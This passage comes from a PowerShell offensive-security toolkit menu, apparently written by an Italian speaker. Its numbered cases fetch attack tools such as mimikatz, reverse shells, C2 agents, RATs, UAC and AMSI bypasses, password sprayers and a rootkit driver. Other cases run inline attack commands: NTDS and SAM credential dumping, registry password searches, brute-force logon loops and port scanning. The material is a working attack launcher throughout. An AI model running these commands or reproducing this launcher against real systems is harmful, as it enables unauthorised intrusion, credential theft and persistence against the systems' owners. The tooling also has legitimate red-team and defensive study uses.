        '220' {Scarica "johnnyDEP/OWA-Toolkit" "OWA-Toolkit.psm1" "johnnyDEP/OWA-Toolkit/master/OWA-Toolkit.psm1"}
        '221' {Get-NetDomain; write-host "Digit the domain"; $DOMNAME=read-host "(example, domain.topdom)"; if($DOMNAME -ne ""){Get-NetDomain -domain $DOMNAME}; Get-DomainSID; (Get-DomainPolicy)."system access"; Get-NetDomainController; Get-NetUser; write-host "Digit a property name"; $PROP=read-host "(example, pwdlastset)"; if($PROP -ne ""){Get-UserProperty –Properties $PROP}; write-host "Digit a word to search"; $WORD=read-host "(example, pass)"; if($WORD -ne ""){Find-UserField -SearchField Description –SearchTerm $WORD}; Get-NetComputer; Get-NetComputer -Ping; Get-NetGroup; Get-NetGroup *admin*; Get-NetGroupMember -GroupName "Domain Admins"; Invoke-UserHunter; Invoke-UserHunter -CheckAccess; Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs; Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}; Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter "ResetPassword"; write-host "Digit a Username to get info"; $USERNAME=read-host "(example, admin)"; if($USERNAME -ne ""){Get-NetGroup –UserName $USERNAME; Find-GPOLocation -UserName $USERNAME; Invoke-UserHunter -UserName $USERNAME}; write-host "Digit a Domain, a Computer Name or IP to get info"; $COMNAME=read-host "(example, office-com)"; if($COMNAME -ne ""){Get-NetLocalGroup –ComputerName $COMNAME; Get-NetLoggedon –ComputerName $COMNAME; Get-LastLoggedOn –ComputerName $COMNAME; Get-NetGPO -ComputerName $COMNAME; Find-GPOComputerAdmin –Computername $COMNAME}; Invoke-ShareFinder; Get-NetOU; Get-NetDomainTrust; Get-NetForest; write-host "Digit a ForestName to get info"; $FORESTNAME=read-host "(example, ?)"; if($FORESTNAME -ne ""){Get-NetForest -Forest $FORESTNAME}; Get-NetForestDomain; Get-NetForestCatalog; Get-NetForestTrust; Find-LocalAdminAccess; Invoke-EnumerateLocalAdmin}
        '222' {$DOMNAME=read-host "Digit a domain"; if($DOMNAME -ne ""){setspn -T $DOMNAME -F -Q */*}}
        '223' {Scarica "tmenochet/PowerSpray" "PowerSpray.ps1" "tmenochet/PowerSpray/master/PowerSpray.ps1"}
        '224' {ScaricaSSL "phackt/accesschk-XP" "accesschk-XP.exe" "phackt/pentest/raw/master/privesc/windows/accesschk-XP.exe"}
        '225' {ScaricaExt "sysinternals/accesschk" "accesschk.exe" "https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe"}
        '226' {ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q}
        '227' {write-host "Digit a fullpath file to analyze the stream"; $FLNM=read-host "(example, ./evidence.txt)"; if($FLNM -ne ""){if(test-path $FLNM){get-item -path $FLNM -stream *; write-host "Digit a value inside stream property"; $FLEX=read-host "(example, my.exe)"; if($FLEX -ne ""){if(test-path $FLEX){get-item -path $FLNM -stream $FLEX; write-host "Try to dump ADS content?"; $RSP=read-host "Y/n(default n)"; if($RSP -eq "Y"){get-content -path $FLNM -stream $FLEX}}}}}}
        '228' {ScaricaSSL "0xd4d/dnSpy" "dnSpy.zip" "0xd4d/dnSpy/archive/master.zip"}
        '229' {ScaricaExt "ollydbg.de/odbg110" "odbg110.zip" "http://www.ollydbg.de/odbg110.zip"}
        '230' {ScaricaExt "rada.re/radare2-w32-2.2.0" "radare2-w32-2.2.0.zip" "http://bin.rada.re/radare2-w32-2.2.0.zip"}
        '231' {ScaricaSSL "limbenjamin/nTimetools/nTimestomp_v1.1_x64" "nTimestomp_v1.1_x64.exe" "limbenjamin/nTimetools/raw/master/nTimestomp_v1.1_x64.exe"; ScaricaSSL "limbenjamin/nTimetools/nTimeview_v1.0_x64" "nTimeview_v1.0_x64.exe" "limbenjamin/nTimetools/raw/master/nTimeview_v1.0_x64.exe"}
        '232' {ScaricaBat "hyp3rlinx/DarkFinger-C2-Agent" "DarkFinger-C2-Agent.bat" "hyp3rlinx/DarkFinger-C2/master/DarkFinger-C2-Agent.bat"}
        '233' {Scarica "antonioCoco/Invoke-RunasCs" "Invoke-RunasCs.ps1" "antonioCoco/RunasCs/master/Invoke-RunasCs.ps1"}
        '234' {ScaricaExt "torbrowser/9.5/tor-win64-0.4.3.5" "tor-win64-0.4.3.5.zip" "https://archive.torproject.org/tor-package-archive/torbrowser/9.5/tor-win64-0.4.3.5.zip"}
        '235' {ScaricaExt "torbrowser/9.5/tor-win32-0.4.3.5" "tor-win32-0.4.3.5.zip" "https://archive.torproject.org/tor-package-archive/torbrowser/9.5/tor-win32-0.4.3.5.zip"}
        '236' {ScaricaBat "360-Linton-Lab/WMIHACKER" "WMIHACKER_0.6.vbs" "360-Linton-Lab/WMIHACKER/master/WMIHACKER_0.6.vbs"}
        '237' {ScaricaRel "gentilkiwi/mimikatz"}
        '238' {Scarica "3v4Si0N/HTTP-revshell/Invoke-WebRev" "Invoke-WebRev.ps1" "3v4Si0N/HTTP-revshell/master/Invoke-WebRev.ps1"}
        '239' {Scarica "3v4Si0N/HTTP-revshell/Revshell-Generator" "Revshell-Generator.ps1" "3v4Si0N/HTTP-revshell/master/Revshell-Generator.ps1"}
        '240' {Scarica "besimorhino/powercat" "powercat.ps1" "besimorhino/powercat/master/powercat.ps1"}
        '241' {ScaricaSSL "r00t-3xp10it/meterpeter" "meterpeter.zip" "r00t-3xp10it/meterpeter/archive/master.zip"}
        '242' {Scarica "danielwolfmann/Invoke-WordThief" "Invoke-WordThief.ps1" "danielwolfmann/Invoke-WordThief/master/Invoke-WordThief.ps1"}
        '243' {ScaricaSSL "InfosecMatter/Minimalistic-offensive-security-tools" "Minimalistic-offensive-security-tools.zip" "InfosecMatter/Minimalistic-offensive-security-tools/archive/master.zip"}
        '244' {ScaricaSSL "phackt/Invoke-Recon" "Invoke-Recon.zip" "phackt/Invoke-Recon/archive/master.zip"}
        '245' {Scarica "the-xentropy/xencrypt" "xencrypt.ps1" "the-xentropy/xencrypt/master/xencrypt.ps1"}
        '246' {ScaricaSSL "nccgroup/acCOMplice" "aCOMplice.zip" "nccgroup/acCOMplice/archive/master.zip"}
        '247' {Scarica "JoelGMSec/AutoRDPwn" "AutoRDPwn.ps1" "JoelGMSec/AutoRDPwn/master/AutoRDPwn.ps1"}
        '248' {ScaricaSSL "k8gege/PowerLadon" "Ladon6.6_all.ps1" "k8gege/PowerLadon/raw/master/Ladon6.6_all.ps1"}
        '249' {Scarica "p3nt4/Invoke-SocksProxy" "Invoke-SocksProxy.psm1" "p3nt4/Invoke-SocksProxy/master/Invoke-SocksProxy.psm1"}
        '250' {Scarica "dafthack/MSOLSpray" "MSOLSpray.ps1" "dafthack/MSOLSpray/master/MSOLSpray.ps1"}
        '251' {Scarica "NotMedic/NetNTLMtoSilverTicket" "Get-SpoolStatus.ps1" "NotMedic/NetNTLMtoSilverTicket/master/Get-SpoolStatus.ps1"}
        '252' {ScaricaSSL "BankSecurity/Red_Team" "Red_Team.zip" "BankSecurity/Red_Team/archive/master.zip"}
        '253' {Scarica "cutaway-security/chaps" "chaps-powersploit.ps1" "cutaway-security/chaps/master/chaps-powersploit.ps1"; Scarica "cutaway-security/chaps" "chaps.ps1" "cutaway-security/chaps/master/chaps.ps1"}
        '254' {ScaricaSSL "QAX-A-Team/CobaltStrike-Toolset" "CobaltStrike-Toolset.zip" "QAX-A-Team/CobaltStrike-Toolset/archive/master.zip"}
        '255' {ScaricaSSL "ecstatic-nobel/pOSINT" "pOSINT.zip" "ecstatic-nobel/pOSINT/archive/master.zip"}
        '256' {ScaricaSSL "Kevin-Robertson/Inveigh" "Inveigh.zip" "Kevin-Robertson/Inveigh/archive/master.zip"}
        '257' {ScaricaSSL "scipag/KleptoKitty" "KleptoKitty.zip" "scipag/KleptoKitty/archive/master.zip"}
        '258' {Scarica "scipag/PowerShellUtilities/Invoke-MimikatzNetwork" "Invoke-MimikatzNetwork.ps1" "scipag/PowerShellUtilities/master/Invoke-MimikatzNetwork.ps1"}
        '259' {Scarica "scipag/PowerShellUtilities/Select-MimikatzDomainAccounts" "Select-MimikatzDomainAccounts.ps1" "scipag/PowerShellUtilities/master/Select-MimikatzDomainAccounts.ps1"}
        '260' {Scarica "scipag/PowerShellUtilities/Select-MimikatzLocalAccounts" "Select-MimikatzLocalAccounts.ps1" "scipag/PowerShellUtilities/master/Select-MimikatzLocalAccounts.ps1"}
        '261' {ScaricaSSL "homjxi0e/PowerAvails" "PowerAvails.zip" "homjxi0e/PowerAvails/archive/master.zip"}
        '262' {Scarica "Cybereason/Invoke-WMILM" "Invoke-WMILM.ps1" "Cybereason/Invoke-WMILM/master/Invoke-WMILM.ps1"}
        '263' {Scarica "HarmJ0y/DAMP/Add-RemoteRegBackdoor" "Add-RemoteRegBackdoor.ps1" "HarmJ0y/DAMP/master/Add-RemoteRegBackdoor.ps1"; Scarica "HarmJ0y/DAMP/RemoteHashRetrieval" "RemoteHashRetrieval.ps1" "HarmJ0y/DAMP/master/RemoteHashRetrieval.ps1"}
        '264' {Scarica "phillips321/adaudit" "AdAudit.ps1" "phillips321/adaudit/master/AdAudit.ps1"}
        '265' {Scarica "attactics/Invoke-DCOMPowerPointPivot" "Invoke-DCOMPowerPointPivot.ps1" "attactics/Invoke-DCOMPowerPointPivot/master/Invoke-DCOMPowerPointPivot.ps1"}
        '266' {Scarica "salu90/PSFPT/BruteForce-Basic-Auth" "BruteForce-Basic-Auth.ps1" "salu90/PSFPT/master/BruteForce-Basic-Auth.ps1"}
        '267' {Scarica "salu90/PSFPT/Exfiltrate" "Exfiltrate.ps1" "salu90/PSFPT/master/Exfiltrate.ps1"}
        '268' {Scarica "dafthack/MFASweep" "MFASweep.ps1" "dafthack/MFASweep/master/MFASweep.ps1"}
        '269' {Scarica "p3nt4/Invoke-TmpDavFS" "Invoke-TmpDavFS.psm1" "p3nt4/Invoke-TmpDavFS/master/Invoke-TmpDavFS.psm1"}
        '270' {ScaricaExt "Decompile-Net-code" "Decompile-DotNet.ps1" "https://gallery.technet.microsoft.com/scriptcenter/Decompile-Net-code-in-4581620b/file/134845/1/Decompile-DotNet.ps1"}
        '271' {ScaricaSSL "FuzzySecurity/Capcom-Rootkit/Driver/Capcom" "Capcom.sys" "FuzzySecurity/Capcom-Rootkit/raw/master/Driver/Capcom.sys"}
        '272' {ScaricaRel "odedshimon/BruteShark"}
        '273' {ScaricaRel "ropnop/kerbrute"}
        '274' {ScaricaSSL "sud0woodo/DCOMrade" "DCOMrade.zip" "sud0woodo/DCOMrade/archive/master.zip"}
        '275' {ScaricaRel "quasar/Quasar"}
        '276' {$HFILE=read-host "Digit full path file to hash"; if(test-path $HFILE){$HALGO=read-host "Digit an hash algo"; if($HALGO -ne ""){certutil.exe -hashfile $HFILE $HALGO}}}
        '277' {ScaricaRel "antonioCoco/Mapping-Injection"}
        '278' {ScaricaSSL "ScorpionesLabs/DVS" "DVS.zip" "ScorpionesLabs/DVS/archive/master.zip"}
        '279' {ScaricaSSL "OmerYa/Invisi-Shell/InvisiShellProfiler" "InvisiShellProfiler.dll" "OmerYa/Invisi-Shell/raw/master/build/x64/Release/InvisiShellProfiler.dll"; Scarica "OmerYa/Invisi-Shell/RunWithPathAsAdmin" "RunWithPathAsAdmin.bat" "OmerYa/Invisi-Shell/master/RunWithPathAsAdmin.bat"; Scarica "OmerYa/Invisi-Shell/RunWithRegistryNonAdmin" "RunWithRegistryNonAdmin.bat" "OmerYa/Invisi-Shell/master/RunWithRegistryNonAdmin.bat"}
        '280' {Scarica "lukebaggett/dnscat2-powershell" "dnscat2.ps1" "lukebaggett/dnscat2-powershell/master/dnscat2.ps1"}
        '281' {ScaricaRel "jaredhaight/PSAttackBuildTool"}
        '282' {$DOMAIN=read-host "Digit a Domain name"; if($DOMAIN -ne ""){$USER=read-host "Digit a wordlist username file path"; if(test-path $USER){$FILE=read-host "Digit a wordlist password file path"; if(test-path $FILE){foreach($TENT in get-content $FILE){ $PASS = convertto-securestring $TENT -asplaintext -force; $CRED = new-object system.management.automation.pscredential('$DOMAIN\$USER',$PASS); try{start-process powershell -credential $CRED}catch{}}}}}}
        '283' {$IP=read-host "Digit an IP target"; if($IP -ne ""){$DOMAIN=read-host "Digit a Domain name"; if($DOMAIN -ne ""){$USER=read-host "Digit a wordlist username file path"; if(test-path $USER){$FILE=read-host "Digit a wordlist password file path"; if(test-path $FILE){foreach($TENT in get-content $FILE){$PW = convertto-securestring -asplaintext -force -string $TENT;	$CRED = new-object -typename system.management.automation.pscredential -argumentlist $DOMAIN\$USER,$PW; enter-pssession -computername $IP -credential $CRED}}}}}}
        '284' {write-host "Digit a specific host or a smb name"; $LHST=read-host "(example, VM1 or empty for all)"; if($LHST -ne ""){Get-SmbShare -Name $LHST | Format-List -Property *}else{Get-SmbShare | Format-List -Property *}}
        '285' {write-host "Digit a specific path with extension"; $EXT=read-host "(example, *.xml)"; if($EXT -ne ""){write-host "Digit a regular expression, use a pipe to search more words"; $RGX=read-host "(example, passws|password)"; if($RGX -ne ""){get-childitem -recurse $EXT|select-string -pattern $RGX}}}
        '286' {Scarica "Viralmaniar/Remote-Desktop-Caching" "rdpcache.ps1" "Viralmaniar/Remote-Desktop-Caching-/master/rdpcache.ps1"}
        '287' {Scarica "AdamDotCom/memcached-on-powershell" "memcached-on-powershell.ps1" "AdamDotCom/memcached-on-powershell/master/memcached-on-powershell.ps1"}
        '288' {ScaricaExt "technet.microsoft/scriptcenter/NLA" "NLA.ps1" "https://gallery.technet.microsoft.com/scriptcenter/Powershell-script-to-9d66257a/file/150221/1/NLA.ps1"}
        '289' {nslookup myip.opendns.com resolver1.opendns.com}
        '290' {ScaricaRel "bettercap/bettercap"}
        '291' {$(Resolve-DnsName -Name myip.opendns.com -Server 208.67.222.220).IPAddress}
        '292' {Scarica "Z3R0th-13/Enum" "Enum.ps1" "Z3R0th-13/Enum/master/Enum.ps1"}
        '293' {Scarica "duckingtoniii/Powershell-Domain-User-Enumeration" "User_Enumeration.ps1" "duckingtoniii/Powershell-Domain-User-Enumeration/master/User_Enumeration.ps1"}
        '294' {Scarica "Z3R0th-13/Profit" "Profit.ps1" "Z3R0th-13/Profit/master/Profit.ps1"}
        '295' {ScaricaSSL "Xservus/P0w3rSh3ll" "P0w3rSh3ll.zip" "Xservus/P0w3rSh3ll/archive/master.zip"}
        '296' {Scarica "threatexpress/red-team-scripts/HostEnum" "HostEnum.ps1" "threatexpress/red-team-scripts/master/HostEnum.ps1"}
        '297' {Scarica "silentsignal/wpc-ps/WindowsPrivescCheck" "WindowsPrivescCheck.psm1" "silentsignal/wpc-ps/master/WindowsPrivescCheck/WindowsPrivescCheck.psm1"}
        '298' {ScaricaSSL "pentestmonkey/windows-privesc-check" "windows-privesc-check2.exe" "pentestmonkey/windows-privesc-check/raw/master/windows-privesc-check2.exe"}
        '299' {write-host "Digit an IP to get its net infos"; $TIP=read-host "(example, 192.168.1.10)"; if($IP -ne ""){get-netipaddress -ipaddress $TIP | select-object}}
        '300' {write-host "Digit an IP with protocol to get docker version"; $TIP=read-host "(example, http://192.168.1.10)"; if($TIP -ne ""){try{invoke-webrequest -uri $TIP":2376/version"}catch{}}}
        '301' {write-host "Digit a target domain to get users infos via finger"; $TDMN=read-host "(example, example.com)"; if($TDMN -ne ""){finger -l "@$TDMN"}}
        '302' {write-host "Digit a file name of exploit"; $EXPL=read-host "(example, 123)"; if($EXPL -ne ""){ScaricaEDB $EXPL}}
        '303' {Scarica "kmkz/PowerShell/amsi-bypass" "amsi-bypass.ps1" "kmkz/PowerShell/master/amsi-bypass.ps1"}
        '304' {Scarica "kmkz/PowerShell/CLM-bypass" "CLM-bypass.ps1" "kmkz/PowerShell/master/CLM-bypass.ps1"}
        '305' {Scarica "kmkz/PowerShell/ole-payload-generator" "ole-payload-generator.ps1" "kmkz/PowerShell/master/ole-payload-generator.ps1"}
        '306' {Scarica "kmkz/PowerShell/Reverse-Shell" "Reverse-Shell.ps1" "kmkz/PowerShell/master/Reverse-Shell.ps1"}
        '307' {Scarica "nettitude/Invoke-PowerThIEf" "Invoke-PowerThIEf.ps1" "nettitude/Invoke-PowerThIEf/master/Invoke-PowerThIEf.ps1"}
        '308' {Scarica "3gstudent/CLR-Injection_x64" "CLR-Injection_x64.bat" "3gstudent/CLR-Injection/master/CLR-Injection_x64.bat"}
        '309' {Scarica "3gstudent/CLR-Injection_x86" "CLR-Injection_x86.bat" "3gstudent/CLR-Injection/master/CLR-Injection_x86.bat"}
        '310' {Scarica "3gstudent/COM-Object-hijacking" "COM-Object-hijacking-persistence.ps1" "3gstudent/COM-Object-hijacking/master/COM%20Object%20hijacking%20persistence.ps1"}
        '311' {ScaricaSSL "3gstudent/Winpcap_Install" "Winpcap.zip" "3gstudent/Winpcap_Install/archive/master.zip"}
        '312' {Scarica "3gstudent/Dump-Clear-Password-after-KB2871997-installed" "dump.ps1" "3gstudent/Dump-Clear-Password-after-KB2871997-installed/master/dump.ps1"}
        '313' {ScaricaExt "chocolatey" "install.ps1" "https://chocolatey.org/install.ps1"}
        '314' {ScaricaRel "zyedidia/micro"}
        '316' {Scarica "canix1/ADACLScanner" "ADACLScan.ps1" "canix1/ADACLScanner/master/ADACLScan.ps1"}
        '317' {ScaricaSSL "cyberark/ACLight" "ACLight.zip" "cyberark/ACLight/archive/master.zip"}
        '318' {Scarica "roggenk/PowerShell/LDAPS" "LDAPS.ps1" "roggenk/PowerShell/master/LDAPS/LDAPS.ps1"}
        '319' {ScaricaExt "microsoft/scriptcenter/GetRegistryKeyLastWriteTimeAndClassName" "GetRegistryKeyLastWriteTimeAndClassName.zip" "https://gallery.technet.microsoft.com/scriptcenter/Get-Last-Write-Time-and-06dcf3fb/file/106244/1/GetRegistryKeyLastWriteTimeAndClassName.zip"}
        '320' {Scarica "wavestone-cdt/powerpxe" "PowerPXE.ps1" "wavestone-cdt/powerpxe/master/PowerPXE.ps1"}
        '321' {write-host "Digit a xml file fullpath"; $XFL=read-host "(example, admin.xml)"; if(test-path $XFL){$XML=Import-CliXml -Path $XFL; $XML.GetNetworkCredential().Password; select-string -pattern "UserName" $XFL; write-host "Digit the username"; $USRN=read-host "(example, admin)"; if($USRN -ne ""){$XML.GetNetworkCredential().$USRN}}}
        '322' {write-host "Digit an IP target"; $TIP=read-host "(example, 192.168.1.188)"; if($TIP -ne ""){write-host "Scanning "$TIP; for($PORT=1; $PORT -le 65536; $PORT++){try{$SOCK=new-object system.net.sockets.tcpclient($TIP, $PORT); if($SOCK.connected){write-host $PORT"`topen"}$SOCK.Close()}catch{}}}}
        '323' {[NtApiDotNet.NtSystemInfo]::CodeIntegrityPolicy}
        '324' {ScaricaExt "sysinternals/AccessChk" "AccessChk.zip" "https://download.sysinternals.com/files/AccessChk.zip"}
        '325' {systeminfo; wmic qfe}
        '326' {Get-ChildItem Env: | ft Key,Value}
        '327' {Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root}
        '328' {whoami /priv}
        '329' {net users; Get-ChildItem C:\Users -Force | select Name; qwinsta}
        '330' {net localgroup}
        '331' {net localgroup Administrators}
        '332' {Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"}
        '333' {Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\; Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\}
        '334' {cmd.exe /c '%SYSTEMROOT%\repair\SAM && %SYSTEMROOT%\System32\config\RegBack\SAM && %SYSTEMROOT%\System32\config\SAM && %SYSTEMROOT%\repair\system && %SYSTEMROOT%\System32\config\SYSTEM && %SYSTEMROOT%\System32\config\RegBack\system'}
        '335' {Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime; Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name}
        '336' {cmd.exe /c 'accesschk.exe -qwsu "Everyone" * && accesschk.exe -qwsu "Authenticated Users" * && accesschk.exe -qwsu "Users" *'}
        '337' {gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name}
        '338' {Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State}
        '339' {Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl; Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'; Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'; Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'; Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'; Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"; Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"}
        '340' {reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated}
        '341' {reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s}
        '342' {reg query HKCU /f password /t REG_SZ /s; reg query HKLM /f password /t REG_SZ /s}
        '343' {Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}}
        '344' {ScaricaSSL "Mr-Un1k0d3r/RedTeamCSharpScripts/WMIUtility" "WMIUtility.exe" "Mr-Un1k0d3r/RedTeamCSharpScripts/raw/master/WMIUtility.exe"}
        '345' {ScaricaSSL "Mr-Un1k0d3r/RedTeamCSharpScripts/enumerateuser" "enumerateuser.exe" "Mr-Un1k0d3r/RedTeamCSharpScripts/raw/master/enumerateuser.exe"}
        '346' {ScaricaSSL "Mr-Un1k0d3r/RedTeamCSharpScripts/ldapquery" "ldapquery.exe" "Mr-Un1k0d3r/RedTeamCSharpScripts/raw/master/ldapquery.exe"}
        '347' {ScaricaSSL "Mr-Un1k0d3r/RedTeamCSharpScripts/ldaputility" "ldaputility.exe" "Mr-Un1k0d3r/RedTeamCSharpScripts/raw/master/ldaputility.exe"}
        '348' {ScaricaSSL "Mr-Un1k0d3r/RedTeamCSharpScripts/set" "set.exe" "Mr-Un1k0d3r/RedTeamCSharpScripts/raw/master/set.exe"}
        '349' {ScaricaSSL "Mr-Un1k0d3r/RedTeamCSharpScripts/unmanagedps" "unmanagedps.exe" "Mr-Un1k0d3r/RedTeamCSharpScripts/raw/master/unmanagedps.exe"}
        '350' {ScaricaSSL "Mr-Un1k0d3r/RedTeamCSharpScripts/webhunter" "webhunter.exe" "Mr-Un1k0d3r/RedTeamCSharpScripts/raw/master/webhunter.exe"}
        '351' {ScaricaSSL "Mr-Un1k0d3r/RedTeamCSharpScripts/wmiutility" "wmiutility2.exe" "Mr-Un1k0d3r/RedTeamCSharpScripts/raw/master/wmiutility.exe"}
        '352' {write-host "you will get https://github.com/rvrsh3ll/Misc-Powershell-Scripts"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "rvrsh3ll/Misc-Powershell-Scripts/$FILENAME" "$FILENAME" "rvrsh3ll/Misc-Powershell-Scripts/master/$FILENAME"}}
        '353' {ScaricaGist "ankitdobhal/TTLOs" "TTLOs.psm1" "ankitdobhal/8ab380ad0290028f9a1efe6333683a5a/raw/40cb310019e0acf132239c955c28a8558f5b8a20/TTLOs.psm1"}
        '354' {ScaricaRel "Killeroo/PowerPing"}
        '356' {ScaricaSSL "PowerShellMafia/PowerSploit" "PowerSploit.zip" "PowerShellMafia/PowerSploit/archive/master.zip"}
        '357' {ScaricaSSL "fireeye/commando-vm" "commando-vm.zip" "fireeye/commando-vm/archive/master.zip"}
        '358' {ScaricaSSL "DarkCoderSc/Win32/win-brute-logon" "WinBruteLogon.exe" "DarkCoderSc/win-brute-logon/raw/master/Win32/Release/WinBruteLogon.exe"}
        '359' {ScaricaSSL "DarkCoderSc/Win64/win-brute-logon" "WinBruteLogon.exe" "DarkCoderSc/win-brute-logon/raw/master/Win64/Release/WinBruteLogon.exe"}
        '360' {ScaricaSSL "L3cr0f/DccwBypassUAC" "DccwBypassUAC.exe" "L3cr0f/DccwBypassUAC/raw/release/DccwBypassUAC/Release/DccwBypassUAC.exe"}
        '361' {Scarica "3gstudent/Bypass-Windows-AppLocker" "AppLockerBypassChecker-v1.ps1" "3gstudent/Bypass-Windows-AppLocker/master/AppLockerBypassChecker-v1.ps1"}
        '362' {ScaricaGist "netbiosX/FodhelperUACBypass" "FodhelperUACBypass.ps1" "netbiosX/a114f8822eb20b115e33db55deee6692/raw/bd61ba9db7af8ffcd57d3dbfa8208b495cdc854d/FodhelperUACBypass.ps1"}
        '363' {Scarica "gushmazuko/WinBypass/SluiHijackBypass_direct" "SluiHijackBypass_direct.ps1" "gushmazuko/WinBypass/master/SluiHijackBypass_direct.ps1"}
        '364' {Scarica "gushmazuko/WinBypass/SluiHijackBypass" "SluiHijackBypass.ps1" "gushmazuko/WinBypass/master/SluiHijackBypass.ps1"}
        '365' {Scarica "gushmazuko/WinBypass/EventVwrBypass" "EventVwrBypass.ps1" "gushmazuko/WinBypass/master/EventVwrBypass.ps1"}
        '366' {Scarica "gushmazuko/WinBypass/DiskCleanupBypass_direct" "DiskCleanupBypass_direct.ps1" "gushmazuko/WinBypass/master/DiskCleanupBypass_direct.ps1"}
        '367' {ScaricaBat "Mncx86/Windows-10-UAC-bypass" "uacdisabler.bat" "Mncx86/Windows-10-UAC-bypass/master/uacdisabler.bat"}
        '368' {write-host 'you will get https://github.com/offensive-security/exploitdb - windows/local'; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "offensive-security/exploitdb/master/exploits/windows/local/$FILENAME" "$FILENAME" "offensive-security/exploitdb/master/exploits/windows/local/$FILENAME"}}
        '369' {ScaricaRel "PwnDexter/SharpEDRChecker"}
        '370' {Scarica "3gstudent/Javascript-Backdoor (real name, JSRat)" "JSRat.ps1" "3gstudent/Javascript-Backdoor/master/JSRat.ps1"}
        '371' {ScaricaRel "icsharpcode/AvaloniaILSpy"}
        '372' {ScaricaSSL "BenChaliah/Arbitrium-RAT" "Arbitrium-RAT.zip" "BenChaliah/Arbitrium-RAT/archive/main.zip"}
        '373' {ScaricaRel "antonioCoco/RoguePotato"}
        '374' {ScaricaRel "BloodHoundAD/BloodHound"}
        '376' {ScaricaSSL "enigma0x3/Old-Powershell-payload-Excel-Delivery" "Old-Powershell-payload-Excel-Delivery.zip" "enigma0x3/Old-Powershell-payload-Excel-Delivery/archive/master.zip"}
        '377' {Scarica "gfoss/PSRecon" "psrecon.ps1" "gfoss/PSRecon/master/psrecon.ps1"; Scarica "gfoss/PSRecon/actions" "actions.xml" "gfoss/PSRecon/master/actions.xml"}
        '378' {Scarica "enigma0x3/Powershell-C2" "C2Code.ps1" "enigma0x3/Powershell-C2/master/C2Code.ps1"; Scarica "enigma0x3/Powershell-C2/Macro" "Macro" "enigma0x3/Powershell-C2/master/Macro"}
        '379' {Scarica "orlyjamie/mimikittenz" "Invoke-mimikittenz.ps1" "orlyjamie/mimikittenz/master/Invoke-mimikittenz.ps1"}
        '380' {ScaricaRel "uknowsec/SharpSQLTools"}
        '381' {ScaricaExt "digitalcorpora/bulk_extractor32" "bulk_extractor32.exe" "http://downloads.digitalcorpora.org/downloads/bulk_extractor/bulk_extractor32.exe"}
        '382' {ScaricaExt "digitalcorpora/bulk_extractor64" "bulk_extractor64.exe" "http://downloads.digitalcorpora.org/downloads/bulk_extractor/bulk_extractor64.exe"}
        '383' {ScaricaRel "Invoke-IR/PowerForensics"}
        '385' {ScaricaSSL "EvotecIT/GPOZaurr" "GPOZaurr.zip" "EvotecIT/GPOZaurr/archive/master.zip"}
        '386' {ScaricaRel "moonD4rk/HackBrowserData"}
        '387' {ScaricaSSL "deepsecurity-pe/GoGhost" "GoGhost_win_amd64.exe" "deepsecurity-pe/GoGhost/raw/master/GoGhost_win_amd64.exe"}
        '388' {Scarica "thom-s/netsec-ps-scripts/printer-telnet-ftp-report" "printer-telnet-ftp-report.ps1" "thom-s/netsec-ps-scripts/master/printer-telnet-ftp-report/printer-telnet-ftp-report.ps1"}
        '389' {Scarica "tokyoneon/Chimera/shells/Invoke-PowerShellIcmp" "Invoke-PowerShellIcmp.ps1" "tokyoneon/Chimera/master/shells/Invoke-PowerShellIcmp.ps1"}
        '390' {Scarica "tokyoneon/Chimera/shells/Invoke-PowerShellTcp" "Invoke-PowerShellTcp.ps1" "tokyoneon/Chimera/master/shells/Invoke-PowerShellTcp.ps1"}
        '391' {Scarica "tokyoneon/Chimera/shells/Invoke-PowerShellTcpOneLine" "Invoke-PowerShellTcpOneLine.ps1" "tokyoneon/Chimera/master/shells/Invoke-PowerShellTcpOneLine.ps1"}
        '392' {Scarica "tokyoneon/Chimera/shells/Invoke-PowerShellUdp" "Invoke-PowerShellUdp.ps1" "tokyoneon/Chimera/master/shells/Invoke-PowerShellUdp.ps1"}
        '393' {Scarica "tokyoneon/Chimera/shells/Invoke-PowerShellUdpOneLine" "Invoke-PowerShellUdpOneLine.ps1" "tokyoneon/Chimera/master/shells/Invoke-PowerShellUdpOneLine.ps1"}
        '394' {Scarica "tokyoneon/Chimera/shells/generic1" "generic1.ps1" "tokyoneon/Chimera/master/shells/generic1.ps1"}
